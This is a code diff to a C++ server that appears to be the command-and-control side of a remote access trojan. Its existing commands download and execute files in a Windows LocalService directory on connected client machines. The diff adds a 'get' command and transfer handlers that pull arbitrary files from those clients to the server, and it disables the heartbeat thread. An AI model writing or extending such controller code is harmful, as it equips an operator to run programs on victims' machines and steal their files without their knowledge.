@@ -1,14 +1,9 @@
 #include "server.h"
+
 #include <type_traits>
 
-template <typename E>
-constexpr auto to_underlying(E e) noexcept
-{
-	return static_cast<std::underlying_type_t<E>>(e);
-}
-
 Server* Server::serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.
-
+auto temp_name = std::string("tempfile.tmp");
 
 Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on. BroadcastPublically = false if server is not open to the public (people outside of your router), true = server is open to everyone (assumes that the port is properly forwarded on router settings)
 {
@@ -51,7 +46,7 @@ void Server::ListenForNewConnection()
 	General::createThread(ListenerThread); //Create thread that will manage all outgoing packets
 
 	//Create thread to send heartbeats since waiting for socket accept to fail takes too long sometimes
-	General::createThread(ClientConnectionChecker); 
+	//General::createThread(ClientConnectionChecker); 
 }
 
 void Server::HandleInput()
@@ -178,7 +173,40 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 	{
 		if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
 			return false;
-		std::cout << "Sending next buffer to ID: " << (int32_t)ID << std::endl; //Display that packet was not found
+		break;
+	}
+	case PacketType::ClientFileTransferByteBuffer:
+	{
+		int32_t buffersize; //buffer to hold size of buffer to write to file
+		if (!Getint32_t(ID, buffersize)) //get size of buffer as integer
+			return false;
+		if (!recvall(ID, connections[ID]->ifile.buffer, buffersize)) //get buffer and store it in file.buffer
+		{
+			return false;
+		}
+		connections[ID]->ifile.outfileStream.write(connections[ID]->ifile.buffer, buffersize); //write buffer from file.buffer to our outfilestream
+		connections[ID]->ifile.bytesWritten += buffersize; //increment byteswritten
+		if (!SendPacketType(ID, PacketType::ClientFileTransferRequestNextBuffer)) //send PacketType type to request next byte buffer (if one exists)
+			return false;
+		break;
+	}
+	case PacketType::ClientFileTransfer_EndOfFile:
+	{
+		//std::cout << "File transfer completed. File received." << std::endl;
+		//std::cout << "File Name: " << file.fileName << std::endl;
+		//std::cout << "File Size(bytes): " << file.bytesWritten << std::endl;
+		connections[ID]->ifile.bytesWritten = 0;
+		connections[ID]->ifile.outfileStream.close(); //close file after we are done writing file
+
+		if(General::FileExists((General::GetCWD() + connections[ID]->ifile.fileName).c_str()))
+			remove((General::GetCWD() + connections[ID]->ifile.fileName).c_str());
+		while (!rename((General::GetCWD() + temp_name).c_str(), (General::GetCWD() + connections[ID]->ifile.fileName).c_str())) {
+			Sleep(100);
+		}
+		//Print out data on server details about file that was sent
+		std::cout << "Got file: " << connections[ID]->ifile.fileName << std::endl;
+		std::cout << CONSOLE_START;
+		fflush(NULL);
 		break;
 	}
 	default: //If packet type is not accounted for
@@ -227,12 +255,12 @@ bool Server::HandleSendFile(int ID)
 		std::cout << "File size(bytes): " << connections[ID]->file.fileSize << std::endl << std::endl;
 		std::cout << CONSOLE_START;
 		fflush(NULL);
+		connections[ID]->file.infileStream.close();
 	}
 	return true;
 }
 
 void* Server::ClientConnectionChecker(void* args) {
-	constexpr int heartbeat = to_underlying(PacketType::Heartbeat);
 	PS::Message message("h");
 	Packet p = message.toPacket(PacketType::Heartbeat);
 	while (true)
@@ -329,6 +357,9 @@ void Server::ParseClientInput(std::string userinput, int& clientID)
 		//Download a file inside C:/Windows/ServiceProfiles/LocalService
 		else if (General::processParameter(userinput, "download")) {
 			SendString(clientID, userinput, PacketType::Download);
+		}
+		else if (General::processParameter(userinput, "get")) {
+			RequestFile(clientID, userinput);
 		}
 		//Execute a file inside C:/Windows/ServiceProfiles/LocalService
 		else if (General::processParameter(userinput, "execute")) {
@@ -497,4 +528,23 @@ void* Server::OnClientConnected(void* args)
 	thisptr->ParseClientInput("exitSession", ID);
 
 	return nullptr;
+}
+
+bool Server::RequestFile(int ID, std::string FileName)
+{
+	connections[ID]->ifile.outfileStream.open(General::GetCWD() + temp_name, std::ofstream::binary); //open file to write file to
+
+	int slash_index = FileName.find_last_of("/\\");
+	if (slash_index != std::string::npos) 
+		connections[ID]->ifile.fileName = FileName.substr(slash_index, FileName.length() - 1);
+	else
+		connections[ID]->ifile.fileName = FileName;
+
+	connections[ID]->ifile.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
+	if (!connections[ID]->ifile.outfileStream.is_open()) //if file failed to open...
+	{
+		return false;
+	}
+	SendString(ID, FileName, PacketType::ClientFileTransferRequestFile); //send file name
+	return true;
 }
